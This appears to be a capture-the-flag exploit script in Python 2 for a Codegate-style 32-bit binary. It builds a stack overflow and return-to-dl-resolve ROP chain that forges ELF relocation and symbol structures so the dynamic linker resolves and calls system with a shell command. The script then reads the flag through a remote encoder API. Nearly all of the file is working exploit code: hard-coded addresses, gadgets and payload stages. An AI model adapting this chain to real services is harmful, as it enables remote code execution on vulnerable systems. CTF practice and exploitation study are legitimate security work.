# Fortunately, it's really similar to yocto challenge on codegate 2015
# which I made it before and presented in codegate one years before
# I named it as "return to dynamic linker"

# The basic idea is, using [got+8] (which is called in each plt+11) and my custom offset to make _dl_runtime_resolve to resolve to my controlled function
# It's called return - to - dl-resolve usually...

# Here is good links in exploiting dynamic linker
# https://www.slideshare.net/inaz2/rop-illmatic-exploring-universal-rop-on-glibc-x8664-ja (page 17)
# http://inaz2.hatenablog.com/entry/2014/07/15/023406
# http://inaz2.hatenablog.com/entry/2014/07/20/161106

# And here is my document
# http://gooverto.tistory.com/entry/Codegate-2014-Junior-Presentation (I modified this a little bit for this binary)
# http://gooverto.tistory.com/entry/Return-To-DL-Exploitation

# BOF payload length for the length field, and stage2 payload goes, and the command.
# must append exit\n to prevent the non-zero exit code

from socket import *
import struct
import time

import sys

buffer = 0x804a120 # "gbuf" address, you must know the address for your payload
target = 0x804a01c # read GOT location
dynstr = 0x804824c # .dynstr section
jmprel = 0x80482e0 # referred in dynamic section
symtab = 0x80481cc # referred in dynamic section
read   = 0x8048340
pppr   = 0x80487b9

######## exploit gadgets ##################################
dynamic_linker = 0x8048330
target_plt     = 0x80482F0

cmd = "bash #" # shell command to execute

p  = lambda x: struct.pack("<L", x)
ph = lambda x: struct.pack("<I", x)
pb = lambda x: struct.pack("<B", x)

log = lambda x: sys.stderr.write(x+'\n')

######## rel ##############################################

rel  = p(target)        # target, anywhere in writable memory
rel += p((((buffer - symtab + 18+16)/16)<<8) + 7) # 16 multiplier (struct)

######## sym ##############################################

sym  = p (buffer - dynstr + 46) # location for 'cmd'
sym += p (0xff)		 # writable int, isn't it?
sym += p (0xff)		 # symbol size (st_size)
sym += pb(0xff)	 	 # symbol info (st_info)
sym += pb(0xf0)	 	 # symbol other - mod 4 must be 0
sym += ph(0xffff)	 # symbol index
sym += "system\x00"

############################################################
s = socket(AF_INET, SOCK_STREAM)

payload = ""
payload += rel                          # struct Elf32_Rel -> Elf32_Sym
payload += "A"*(28-len(payload))        # dummy for multiplier 16
payload += sym                          # struct Elf32_Sym -> "system\x00"
payload += cmd

######### stage0 ######################################

stage0 = ""
stage0 += "A" * 264
stage0 += p(0)
stage0 += p(pppr) + p(0x100) * 3
stage0 += p(read)
stage0 += p(pppr)
stage0 += p(0)
stage0 += p(buffer)
stage0 += p(len(payload))
stage0 += p(dynamic_linker)            # dynamic linker loader (pushes arg1)
stage0 += p(buffer - jmprel)           # arg2: index here
stage0 += p(pppr)                # ret2: ret after 'system'
stage0 += p(buffer + len(payload) - len(cmd)) # location for cmd
stage0 += p(0) * 2 + p(0x8048360) + p(0) * 2
print len(stage0)

stage1  = payload # just for fun


#######################################################

HOST, PORT = '0.0.0.0', 31338
cmd2 = 'cat flag\nexit\n'
if False:
    s.connect((HOST, PORT))

    print "============== exploit: TRIGGER!"
    s.send(stage0)
    s.send(stage1)


    s.send(cmd2)
import requests
r = requests.post('http://gudluck.h4ve.fun:8002/api/encoder', json=(dict(data=(stage0 + stage1 + cmd2).encode('hex'),
length=len(stage0))))
print r.text
print r.json()[u'message'].decode('hex')
